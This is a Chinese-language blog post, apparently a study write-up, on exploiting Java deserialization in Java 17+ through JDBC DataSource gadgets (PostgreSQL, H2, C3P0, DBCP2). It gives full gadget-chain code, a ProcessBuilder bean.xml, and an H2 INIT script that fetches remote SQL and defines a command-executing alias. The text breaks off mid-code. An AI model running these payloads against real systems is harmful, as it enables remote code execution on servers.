<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java 17及更高版本中通过JDBC连接实现反序列化漏洞利用</title>
      <link href="/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于Java 16的变化，让原生反序列化漏洞的利用变得更加艰难。本文主要对参考链接中的思路进行研究学习，实现在Java 17及更高版本中的反序列化漏洞利用。</p><h1 id="1-Jigsaw项目和Java模块化系统"><a href="#1-Jigsaw项目和Java模块化系统" class="headerlink" title="1. Jigsaw项目和Java模块化系统"></a>1. Jigsaw项目和Java模块化系统</h1><p>Java中的一个根本性的变化就是Java 模块化系统，在Java 9开始引入Java模块化系统和Jigsaw项目。</p><p>Java 模块化系统，可以更好地控制JRE&#x2F;libraries的哪些部分由应用程序实际加载以及哪些部分可以通过其他模块访问。</p><p>Java 模块化系统同时也提供了很多好处，比如：性能的改进。</p><blockquote><p>例如：如果要运行像 Apache Tomcat这样的服务，通常不会使用Java运行时的 GUI 组件，所以不需要首先对它们进行加载。甚至可以创建一个只包含应用程序实际使用的模块的简约JRE，非常适合基于容器的环境。</p></blockquote><h1 id="2-Java反射"><a href="#2-Java反射" class="headerlink" title="2. Java反射"></a>2. Java反射</h1><p>在Java 9之前，Java已经提供了某种隔离，主要由编译器强制执行：<code>无法从外部类访问标记为private/protected的方法和属性</code>。但这只是一种弱保护，因为它可以进行绕过。下面是将私有方法<code>internalMethod</code>公开并在之后进行调用的示例：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PrivateObject</span> <span class="variable">privateObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrivateObject</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">internalMethod</span> <span class="operator">=</span> PrivateObject.class.</span><br><span class="line">   getDeclaredMethod(<span class="string">&quot;internalMethod&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">internalMethod.setAccessible(<span class="literal">true</span>); <span class="comment">//设置为允许访问</span></span><br><span class="line"><span class="type">String</span> <span class="variable">returnValue</span> <span class="operator">=</span> (String) internalMethod.invoke(privateObject, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div><p>上面示例中，我们可以绕过模块隔离。因此，要实现一个健壮的Java模块系统，需要允许开发人员定义哪些代码可以从其他模块访问以及哪些部分可以<code>调用/通过</code>反射。定义是通过<code>module-info.java</code>文件来完成的。</p><p>Java开发人员使用Java模块系统来<strong>封装在Java 运行时对不应直接从外部代码调用的内部类的反射访问</strong>。</p><p>从攻击者的角度来看，由于许多已知的反序列化利用工具都采取反射的方法来实现远程代码执行，因此在引入Java模块系统之后，反序列化漏洞的利用成为了一个问题。</p><h1 id="3-不同Java版本的反射访问"><a href="#3-不同Java版本的反射访问" class="headerlink" title="3. 不同Java版本的反射访问"></a>3. 不同Java版本的反射访问</h1><table><thead><tr><th>Java版</th><th>发布日期</th><th>评论</th></tr></thead><tbody><tr><td>Java 9</td><td>2017 年 9 月</td><td>由编译器强制执行的反射访问限制，而不是运行时</td></tr><tr><td>Java 11（长期支持版）</td><td>2018 年 9 月</td><td>非法反射访问会产生警告，但仍然允许</td></tr><tr><td>Java 16</td><td>2021 年 3 月</td><td>在默认设置中阻止非法反射访问</td></tr></tbody></table><p>在Java 17(2017 年 9 月发布)中，发布了第一个不再允许对内部Java类进行反射访问的 LTS 版本，由此防止在反序列化利用工具中对这些内部类进行使用。</p><p><strong>例：在不同Java版本中CommonsBeanutils1的执行</strong></p><p>可以使用ysoserial工具生成Gadget chain(下面截图是使用自己编写的代码生成Gadget chain并进行反序列化)</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar CommonsBeanutils1 <span class="string">&quot;calc&quot;</span> &gt; ./testgadget </span><br></pre></td></tr></table></figure></div><p>CommonBeanutils1允许攻击者在序列化类上调用getter方法，通常是使用<code>getters/setters</code>访问属性的Java bean。</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code>方法会调用</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() </span><br><span class="line">-&gt; TemplatesImpl#newTransformer() </span><br><span class="line">-&gt; TemplatesImpl#getTransletInstance() </span><br><span class="line">-&gt; TemplatesImpl#defineTransletClasses() </span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure></div><p>来执行恶意字节码。</p><p>（1）在Java 11环境中反序列化此对象，运行时会打印出警告，但Payload仍按预期工作，因为尚未强制执行模块访问限制；</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230418114411019.png" alt="image-20230418114411019"></p><p>（2）在Java 17环境中，不再允许对内部类进行反射访问。因此，不再可能在<code>TemplatesImpl</code>类上调用方法。应用程序不执行Payload，而是抛出 IllegalAccessException</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230417152607006.png" alt="image-20230417152607006"></p><p><code>TemplatesImpl</code>类是在大多数Java版本上执行代码的方法，因此被用作许多Gadget chain中的最终接收器。根据上面的内容，在 Java 17环境中，这些Gadget chain不再“开箱即用”。由此需要找到一种方法实现反序列化漏洞在Java 17及更高版本中的利用，由此有了下面的内容：</p><h1 id="4-利用JDBC连接"><a href="#4-利用JDBC连接" class="headerlink" title="4. 利用JDBC连接"></a>4. 利用JDBC连接</h1><p>在Java17之前，已经遇到过类似的情况，如：目标应用使用Serialization Filtering，以防止使用TemplatesImpl类；</p><p>Java 17仍然允许对这些类进行反序列化，但会阻止方法的调用。效果是类似的，都是阻止反序列化。</p><blockquote><p>上面提到：CommonsBeanutils1允许在可序列化类上调用JavaBean，即Getter方法(<code>getXXX</code>)。</p><p>这种思路仍然可以在下面使用，只是不能再依赖Java运行时提供的对象。</p></blockquote><p>创建 JDBC连接有两种不同的方式：</p><ul><li><p>调用静态方法<code>DriverManager.getConnection()</code></p></li><li><p>使用实现<code>DataSource</code>接口的类。</p></li></ul><blockquote><p>由于 DriverManager 类不可序列化，所以我们主要关注DataSource实现：</p><p>DataSource 接口要求实现提供一种getConnection()方法，于是可以使用它来定制CommonsBeanutils链的接收器(类似于TemplatesImpl类)。</p></blockquote><h2 id="4-1-示例1：PostgeSQL-JDBC驱动程序"><a href="#4-1-示例1：PostgeSQL-JDBC驱动程序" class="headerlink" title="4.1. 示例1：PostgeSQL JDBC驱动程序"></a>4.1. 示例1：PostgeSQL JDBC驱动程序</h2><p>PostgeSQLJDBCCB1.java</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PostgeSQLJDBCCB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">PGSimpleDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PGSimpleDataSource</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryClass</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryArg</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080/bean.xml&quot;</span>;</span><br><span class="line">        <span class="comment">//String jdbcUrl = &quot;jdbc:postgresql://localhost:5432/test/?socketFactory=&quot;+socketFactoryClass+ &quot;&amp;socketFactoryArg=&quot;+socketFactoryArg;</span></span><br><span class="line">        <span class="comment">//Connection connection = DriverManager.getConnection(jdbcUrl);</span></span><br><span class="line">        dataSource.setUrl(<span class="string">&quot;jdbc:postgresql://localhost:5432/test/?socketFactory=&quot;</span>+socketFactoryClass+ <span class="string">&quot;&amp;socketFactoryArg=&quot;</span>+socketFactoryArg);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造BeanComparator</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, java.util.Collections.reverseOrder());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造恶意PriorityQueue</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射将property的值设置成connection(即，调用getConnection())</span></span><br><span class="line">        Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;connection&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将恶意的dataSource对象写入到PriorityQueue的queue中</span></span><br><span class="line">        <span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray[<span class="number">0</span>] = dataSource;</span><br><span class="line">        queueArray[<span class="number">1</span>] = dataSource;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        ByteArrayOutputStream baos= <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>bean.xml(放到远程服务器上，这里我放到了<a href="http://127.0.0.1:8008/bean.xml">http://127.0.0.1:8008/bean.xml</a>)</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--普通方式创建类--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;exec&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>在Java 17中，会抛出：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.reflect.InaccessibleObjectException: Unable to make field transient java.lang.Object[] java.util.PriorityQueue.queue accessible: module java.base does not &quot;opens java.util&quot; to unnamed module @255316f2</span><br></pre></td></tr></table></figure></div><p>解决方法：增加vm参数</p><p>(IDEA中：Run—&gt;EditConfigurations…—&gt;Modify options—&gt;Add VM options—&gt;VM options)</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-opens java.base/java.util=ALL-UNNAMED</span><br></pre></td></tr></table></figure></div><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230418152016103.png" alt="image-20230418152016103"></p><p>参考：</p><p><a href="https://pyn3rd.github.io/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/">Make JDBC Attacks Brilliant Again II</a></p><p><a href="https://xz.aliyun.com/t/11812">PostgresQL JDBC Drive 任意代码执行漏洞(CVE-2022-21724)</a></p><h2 id="4-2-示例2：H2-JDBC驱动程序"><a href="#4-2-示例2：H2-JDBC驱动程序" class="headerlink" title="4.2. 示例2：H2 JDBC驱动程序"></a>4.2. 示例2：H2 JDBC驱动程序</h2><p>H2是内存数据库，通常用于演示。</p><p>JDBC连接字符串允许使用SQL命令配置外部文件以通过<code>INIT</code>设置进行数据库初始化(即直接将下面内容填入h2的JDBC URL框中)：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=<span class="number">3</span>;INIT=RUNSCRIPT FROM <span class="string">&#x27;http://127.0.0.1/poc.sql&#x27;</span></span><br></pre></td></tr></table></figure></div><p>H2提供的<code>compiler</code>功能，允许开发人员将自定义函数定义为 Java 代码。恶意INIT脚本可以滥用此功能来进行远程代码执行。</p><p>poc.sql(放到远程服务器上，这里我放到了<a href="http://127.0.0.1:8008/poc.sql">http://127.0.0.1:8008/poc.sql</a>)</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS SHELLEXEC <span class="keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException &#123;</span><br><span class="line">java.util.Scanner s <span class="operator">=</span> <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="keyword">exec</span>(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line"><span class="keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230419142925303.png" alt="image-20230419142925303"></p><p>利用H2连接进行反序列化是困难的。原因：</p><blockquote><p>虽然H2数据库包含可序列化的DataSource实现(JdbcDataSource类)，但由于 JdbcDataSource类是TraceObject派生的，TraceObject类不能进行序列化。</p><p>在反序列化的JdbcDataSource实例上调用<code>getConnection()</code>方法时，代码首先会尝试调用<code>debugCodeCall</code>方法，由于TraceObject类的必要属性未反序列化，所以调用<code>debugCodeCall</code>方法将会失败，从而利用H2连接进行反序列化是困难的。</p></blockquote><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    debugCodeCall(<span class="string">&quot;getConnection&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JdbcConnection</span>(url, <span class="literal">null</span>, userName, StringUtils.cloneCharArray(passwordChars), <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在以前的 Java 版本中，攻击者可以使用<code>JdbcRowSetImpl</code>类绕过此问题。Moritz Bechler提供了<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/CommonsBeanutils.java">CommonsBeanutils链的修改版本</a>，用来进行JNDI调用和创建JDBC连接，参考其思路，这里写了利用H2连接进行反序列化的示例代码：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">H2JDBCCB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        dataSource.setUrl(<span class="string">&quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8008/poc.sql&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造BeanComparator</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, java.util.Collections.reverseOrder());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造恶意PriorityQueue</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射将property的值设置成databaseMetaData(即，调用getDatabaseMetaData())</span></span><br><span class="line">        Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;databaseMetaData&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将恶意的dataSource对象写入到PriorityQueue的queue中</span></span><br><span class="line">        <span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray[<span class="number">0</span>] = dataSource;</span><br><span class="line">        queueArray[<span class="number">1</span>] = dataSource;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        ByteArrayOutputStream baos= <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>反序列化时，通过<code>JdbcRowSetImpl.getDatabaseMetaData()-&gt;this.connect()-&gt;DriverManager.getConnection()</code>来调用getConnection()方法</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230419144617330.png" alt="image-20230419144617330"></p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230419145828354.png" alt="image-20230419145828354"></p><p>与TemplatesImpl 类似，在Java高版本中，这是一个内部Java 类，不能再使用反射访问。因此我们不能直接使用它，但可以通过滥用 JDBC池来进行使用。</p><p>参考：</p><p><a href="https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/">Make JDBC Attacks Brilliant Again I</a></p><h1 id="5-利用JDBC池化"><a href="#5-利用JDBC池化" class="headerlink" title="5. 利用JDBC池化"></a>5. 利用JDBC池化</h1><blockquote><p>JDBC 池是一种用于管理 Java 应用程序中的数据库连接的机制。</p><p>在 JDBC 池中，预先创建并维护一组数据库连接，以供应用程序使用。当应用程序需要访问数据库时，它会从池中请求一个连接，当它使用完连接后，会将它返回到池中而不是关闭它。这使应用程序能够重用现有连接并避免每次需要访问数据库时创建新连接的开销。</p></blockquote><p>常见的JDBC连接池库：</p><table><thead><tr><th>Implementation</th><th>Remark</th></tr></thead><tbody><tr><td>HikariCP</td><td>现代实现，不包括许多序列化类</td></tr><tr><td>Commons DBCP</td><td>Apache 连接池版本 1，提供 JNDI Gadgets</td></tr><tr><td>Commons DBCP2</td><td>Apache 连接池版本 2，提供 JNDI Gadgets</td></tr><tr><td>Druid</td><td>阿里巴巴JDBC连接池</td></tr><tr><td>C3PO</td><td>提供一个直接的Gadget (ComboPooledDataSource)</td></tr><tr><td>Tomcat JDBC</td><td>Tomcat JDBC 池实现，不包括许多序列化类</td></tr></tbody></table><blockquote><p>注意：一些JDBC驱动程序(如：MariaDB)提供了它们自己的池化实现，可以在没有池库的情况下使用。</p></blockquote><h2 id="5-1-示例1：C3PO-ComboPooledDataSource-和-H2"><a href="#5-1-示例1：C3PO-ComboPooledDataSource-和-H2" class="headerlink" title="5.1. 示例1：C3PO ComboPooledDataSource 和 H2"></a>5.1. 示例1：C3PO ComboPooledDataSource 和 H2</h2><p>C3PO ComboPooledDataSource将会获取JDBC连接字符串并将其传递给 JDBC 驱动程序管理器，从而创建一个新实例。这可以与任何JDBC驱动程序一起使用，使其成为一个非常通用的Gadget。</p><p>只需将上面H2JDBCCB1的代码中的JDBC连接部分进行更改，并设置property为connection即可：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">H2JDBCCB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ComboPooledDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComboPooledDataSource</span>();</span><br><span class="line">        dataSource.setJdbcUrl(<span class="string">&quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8008/poc.sql&#x27;&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        ...<span class="comment">//省略重复代码</span></span><br><span class="line">        Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;connection&quot;</span>);</span><br><span class="line">        ...<span class="comment">//省略重复代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>与上面<strong>示例1：PostgeSQL JDBC驱动程序</strong>类似，会抛出异常，解决方法，依旧是增加vm参数：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-opens java.base/java.util=ALL-UNNAMED</span><br></pre></td></tr></table></figure></div><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230419154706778.png" alt="image-20230419154706778"></p><h2 id="5-2-示例2：Apache-Commons-DBCP2-和-H2"><a href="#5-2-示例2：Apache-Commons-DBCP2-和-H2" class="headerlink" title="5.2. 示例2：Apache Commons DBCP2 和 H2"></a>5.2. 示例2：Apache Commons DBCP2 和 H2</h2><p>利用Apache Commons DBCP2进行远程远程代码执行，可以使用<code>SharedPoolDataSource</code>。</p><p>调用<code>getConnection</code>时，会触发以下链：</p><ol><li>对攻击者控制的源(LDAP 服务)执行 JNDI 调用；</li><li>使用<a href="https://github.com/h2database/h2database/blob/master/h2/src/main/org/h2/jdbcx/JdbcDataSourceFactory.java">H2 数据源对象工厂</a>和从 JNDI 调用接收到的属性创建一个新的JdbcDataSource实例；</li><li>在创建的实例上调用<code>getConnection()</code>。</li></ol><p>1.通过JNDI调用的JNDI源代码，方法是根据<a href="https://twitter.com/artsploit">Artsploits </a><a href="https://github.com/artsploit/rogue-jndi">rogue-jndi </a>写一个控制器扩展：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 